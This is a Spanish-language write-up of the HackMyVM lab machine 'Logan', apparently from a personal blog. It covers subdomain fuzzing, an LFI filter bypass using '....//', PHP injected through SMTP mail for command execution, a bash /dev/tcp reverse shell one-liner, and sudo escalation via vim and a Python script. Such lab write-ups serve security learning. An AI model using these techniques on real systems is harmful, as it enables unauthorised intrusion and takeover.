El dia de hoy estaremos resolviendo la maquina Logan de la plataforma de HackMyVm, Aqui dejo el enlance para descargar la [Maquina](https://mega.nz/file/X9dTUYKT#TMxO_vs4M3eKdnrJOvrIxRWKXUOjCRiUDEGDjFW7SCo)

![](/assets/img/logan/machine.png)

## Enumeracion

Empezemos enumerando que puertos tiene abiertos la maquina victima usando la herramienta <code class="language-plaintext highlighter-rouge">nmap</code>


<pre><code class="language-python"><span style="color: green;">❯ nmap</span> 192.168.0.18
Nmap scan report for 192.168.0.18
PORT   STATE SERVICE
25/tcp open  smtp
80/tcp open  http</code></pre>

Solo tenemos dos puertos abiertos el <code class="language-plaintext highlighter-rouge">25</code> que corresponde al servicop <code class="language-plaintext highlighter-rouge">smtp</code>
y el <code class="language-plaintext highlighter-rouge">80</code> Que es un <code class="language-plaintext highlighter-rouge">Servidor Web</code>

Dectectemos que version corren para estos <code class="language-plaintext highlighter-rouge">Puertos</code>.

<pre><code class="language-python"><span style="color: green;">❯ nmap</span> -sCV -p25,80 192.168.0.18
Nmap scan report for 192.168.0.18
PORT   STATE SERVICE
PORT   STATE SERVICE VERSION
25/tcp open  smtp    Postfix smtpd
| ssl-cert: Subject: commonName=logan
| Subject Alternative Name: DNS:logan
| Not valid before: 2023-07-03T13:46:49
|_Not valid after:  2033-06-30T13:46:49
|_smtp-commands: logan.hmv, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING
|_ssl-date: TLS randomness does not represent time
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: Host:  logan.hmv</code></pre>

nmap nos reporta un dominio <code class="language-plaintext highlighter-rouge">logan.hmv</code> agregemos este <code class="language-plaintext highlighter-rouge">dominio</code> al archivo <code class="language-plaintext highlighter-rouge">/etc/hosts</code>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre>
<code class="language-python"><span style="color: green;">❯ echo </span><span style="color: yellow;">"192.168.0.18 logan.hmv"</span><span class='p'> |</span><span style="color: green;"> sudo tee</span> <span class='p'>-a /etc/hosts</span></code></pre></div></div>

Veamos la Web.

![](/assets/img/logan/web.png)

Si nos ponemos a enumerar directorios o archivos en esta web nos encontramos con que no hay nada pero todavia nos queda enumerar <code class="language-plaintext highlighter-rouge">subdominios</code> para esto voy a usar la herramiento <code class="language-plaintext highlighter-rouge">wfuzz</code> y voy a usar un diccionario de [seclists](https://github.com/danielmiessler/SecLists) que es un repositorio de github el cual puedes clonar en tu equipo.

<pre><code class="language-python"><span style="color: green;">❯ wfuzz</span> -c --hh=65 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.logan.hmv' -u http://logan.hmv/ -t 100

********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://logan.hmv/
Total requests: 4989

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                       
=====================================================================

000000024:   200        62 L     101 W      1112 Ch     <span class='p' style="color: green;">"admin"</span>

</code></pre>


Encontramos un <code class="language-plaintext highlighter-rouge">subdominio</code> agreguemoslo al archivo <code class="language-plaintext highlighter-rouge">/etc/hosts</code>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre>
<code class="language-python"><span style="color: green;">❯ echo </span><span style="color: yellow;">"192.168.0.18 admin.logan.hmv"</span><span class='p'> |</span><span style="color: green;"> sudo tee</span> <span class='p'>-a /etc/hosts</span></code></pre></div></div>

Veamos como se ve este <code class="language-plaintext highlighter-rouge">subdominio</code>

![](/assets/img/logan/sub.png)

Tenemos 3 campos pero el unico que esta funcional es el de  <code class="language-plaintext highlighter-rouge">Payments</code>

![](/assets/img/logan/pay.png)

Al entrar en este nos pide un <code class="language-plaintext highlighter-rouge">code</code> y nos muestra como ejemplo 01 y 02

![](/assets/img/logan/code.png)

Si pobramos poniendo cualquier numero nos muestra el siguiente mensaje.

![](/assets/img/logan/exist.png)

Pobremos poniendo el <code class="language-plaintext highlighter-rouge">01</code> que es el numero que nos muestran de ejemplo, este nos devuelve un <code class="language-plaintext highlighter-rouge">Contenido</code>.

![](/assets/img/logan/01.png)

Voy a interceptar esto con <code class="language-plaintext highlighter-rouge">burpsuite</code> para ver como se esta tramitando la peticion.

![](/assets/img/logan/burp.png)

Lo raro en esta peticion es el parametro <code class="language-plaintext highlighter-rouge">file</code> y el error que nos da al momento de poner un numero como el <code class="language-plaintext highlighter-rouge">1</code> que nos dice <code class="language-plaintext highlighter-rouge">File does not exist </code> por lo que posiblemente se pueda aconteser un <code class="language-plaintext highlighter-rouge">LFI.</code>

Intentemos aplicar un <code class="language-plaintext highlighter-rouge">Path Traversal</code> y apuntar al archivo <code class="language-plaintext highlighter-rouge">/etc/passwd</code> pero de esta manera nos sigue diciendo que el archivo no existe.

![](/assets/img/logan/test.png)

Puede ser que se este aplicando algun tipo de sanitizacion y nos este quitando el <code class="language-plaintext highlighter-rouge">../</code> pero como vamos a ver en el siguiente ejemplo esto tiene que estar bien sanitizado para que quite todos los <code class="language-plaintext highlighter-rouge">../</code>  y no solo el primero.

Aqui muestro un ejemplo usando la function <code class="language-plaintext highlighter-rouge">str_replace</code> de php.

Hacemos el mismo <code class="language-plaintext highlighter-rouge">Path Traversal </code>  que aplicamos desde <code class="language-plaintext highlighter-rouge">Burpsuite</code> y observamos que nos queda simplemente la cadena <code class="language-plaintext highlighter-rouge">etc/passwd</code>
![](/assets/img/logan/php.png) 

Esta funcion no es muy segura ya que si en ves de poner <code class="language-plaintext highlighter-rouge">../</code> ponemos <code class="language-plaintext highlighter-rouge">....//</code> al momento de quitar el <code class="language-plaintext highlighter-rouge">../</code> no quedaria otro <code class="language-plaintext highlighter-rouge">../</code> Veamos un ejemplo de esto.

![](/assets/img/logan/bypass.png)

Apliquemos esta teoria en la web para ver si podemos llegar a visualizar el archivo <code class="language-plaintext highlighter-rouge">/etc/passwd</code>y logramos bypassear la sanitizacion que esta aplicando la web y visualizar el archivo.

![](/assets/img/logan/lfi.png)

## Shell - www-data

Veamos Si tenemos capacidad de leer los logs de <code class="language-plaintext highlighter-rouge">SMTP</code> que es el servicio que esta expuesto, la ruta por defecto de este archivo es <code class="language-plaintext highlighter-rouge">/var/log/mail.log</code>

Tenemos capacidad de ver los logs.
![](/assets/img/logan/smtp.png)

Este <code class="language-plaintext highlighter-rouge">Log</code>  en principio no nos sirve para aplicar un <code class="language-plaintext highlighter-rouge">Log Poisoning</code> pero tenemos otro camino para llegar a inyectar comandos.

La idea es la siguiente al momento de enviar un <code class="language-plaintext highlighter-rouge">Correo</code> de un usuario a otro en el maquina se guarda el correo y el contenido de este en la ruta <code class="language-plaintext highlighter-rouge">/var/mail/&lt;username&gt;</code> donde username en este caso va hacer <code class="language-plaintext highlighter-rouge">www-data</code>

Veamos nuevamente el archivo <code class="language-plaintext highlighter-rouge">/etc/passwd</code> para identificar algun usuario.

![](/assets/img/logan/logan.png)

Identificamos al usuario <code class="language-plaintext highlighter-rouge">logan</code> usemos este para enviar el correo.

Voy a usar <code class="language-plaintext highlighter-rouge">telnet</code> para conectarme al servidor, <code class="language-plaintext highlighter-rouge">MAIL FROM</code> es para indicarle quien envia el <code class="language-plaintext highlighter-rouge">Correo</code>, <code class="language-plaintext highlighter-rouge">RCPT TO</code> para indicarle quien es el destinatario y <code class="language-plaintext highlighter-rouge">DATA</code> para indicarle el mensaje que queremos enviar, En el mensaje voy a injectar codigo <code class="language-plaintext highlighter-rouge">php</code> atraves del cual con el parametro <code class="language-plaintext highlighter-rouge">cmd</code> pueda Controlar el comando a <code class="language-plaintext highlighter-rouge">Ejecutar.</code>

![](/assets/img/logan/shell.png)

Como indique anteriormente la ruta en la que se guardan estos correo es en <code class="language-plaintext highlighter-rouge">/var/mail/&lt;username&gt;</code>, Veamos este archivo y comprobemos Si tenemos capacidad de ejecutar <code class="language-plaintext highlighter-rouge">Comandos</code>.

Podemos ver el mail que se envio correctamente.

![](/assets/img/logan/mail.png)

En el <code class="language-plaintext highlighter-rouge">Codigo</code> php que mandamos definimos un parametro <code class="language-plaintext highlighter-rouge">cmd</code> para ejecutar <code class="language-plaintext highlighter-rouge">comandos</code>, Ahora simplemente agreguemos el parametro <code class="language-plaintext highlighter-rouge">cmd</code> y pongamos un comando para ver si nos lo interpreta.

Funciona correctamente.
![](/assets/img/logan/rce.png)

Para enviarme un <code class="language-plaintext highlighter-rouge">ReverShell</code> voy a usar el siguiente <code class="language-plaintext highlighter-rouge">OneLiner</code>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre>
<code class="language-python"><span style="color: green;">bash </span><span class='p'>-c </span><span style="color: yellow;">"bash -i >& /dev/tcp/192.168.0.14/443 0>&1"</span></code></pre></div></div>

Tenemos que <code class="language-plaintext highlighter-rouge">Urlencodear</code> todo el comando.

![](/assets/img/logan/rev.png)

Ganamos accesso a la maquina.

![](/assets/img/logan/cmd.png)


## Shell - logan

Listando nuestros privilegios a nivel de <code class="language-plaintext highlighter-rouge">Sudoers</code> podemos ver que tenemos la capacidad de ejecutar el comando <code class="language-plaintext highlighter-rouge">vim</code> como el usuario <code class="language-plaintext highlighter-rouge">logan</code>.

![](/assets/img/logan/pivo.png)

Atraves de vim hay formas de escapar de este contexto para ganar un <code class="language-plaintext highlighter-rouge">shell</code>, si no vamos a [gtfobins](https://gtfobins.github.io/gtfobins/vim/#shell) no muestran como obtener una shell usando <code class="language-plaintext highlighter-rouge">vim</code>

![](/assets/img/logan/vim.png)

## shell - root

Listemos nuevamente nuestros privilegios a nivel de <code class="language-plaintext highlighter-rouge">Sudoers</code>.

Tenemos capacidad de ejecutar con <code class="language-plaintext highlighter-rouge">python3</code> el archivo <code class="language-plaintext highlighter-rouge">/opt/learn_some_python.py</code> como el usuario <code class="language-plaintext highlighter-rouge">root</code> 
![](/assets/img/logan/python.png)

Intento ver el contenido del archivo <code class="language-plaintext highlighter-rouge">/opt/learn_some_python.py</code> pero no tenemos capacidad de lectura.
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre>
<code class="language-python"><span class='p'>logan@logan:/$ </span><span style="color: green;">cat </span><span class='p'>/opt/learn_some_python.py</span>
<span class='p'>cat: /opt/learn_some_python.py: Permission denied</span></code></pre></div></div>

Ejecutamos el archivo y nos pide un input el cual nos muestra como ejemplo un <code class="language-plaintext highlighter-rouge">print('hello')</code>, lo ponemos y nos muestra el mensaje que le indicamos.

![](/assets/img/logan/learn.png)

Parece que podemos ejecutar codigo en <code class="language-plaintext highlighter-rouge">python</code> libremente por lo que podemos importar la libreria <code class="language-plaintext highlighter-rouge">os</code> y ejecutar un comando.

![](/assets/img/logan/os.png)

Ahora simplemente ejecutamos un <code class="language-plaintext highlighter-rouge">/bin/bash</code> y tendriamos una consola como el usuario <code class="language-plaintext highlighter-rouge">root</code>

![](/assets/img/logan/root.png)

